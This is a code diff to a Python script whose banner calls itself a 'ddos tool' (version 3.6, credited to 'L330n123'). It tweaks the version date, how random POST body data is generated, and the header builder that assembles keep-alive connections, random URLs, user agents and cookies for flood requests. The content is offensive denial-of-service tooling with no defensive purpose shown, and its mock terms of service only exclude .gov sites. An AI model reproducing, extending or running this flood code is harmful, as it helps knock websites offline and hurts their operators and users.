@@ -24,7 +24,7 @@ print ('''
 	 CC/////  CC/////   | ddos tool |/ 
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Version 3.6 (2020/12/14)
+Version 3.6 (2020/12/16)
 							C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
@@ -148,6 +148,7 @@ def randomurl():
 	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
 
 def GenReqHeader(method):
+	global data
 	header = ""
 	if method == "get" or method == "head":
 		connection = "Connection: Keep-Alive\r\n"
@@ -164,7 +165,7 @@ def GenReqHeader(method):
 		user_agent = "User-Agent: " + getuseragent() + "\r\n"
 		accept = Choice(acceptall)
 		if mode2 != "y":# You can enable customize data
-			data = str(random._urandom(16)) 
+			data = str(random._urandom(7))+"="+str(random._urandom(8))
 		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 		if cookies != "":
 			length += "Cookies: "+str(cookies)+"\r\n"
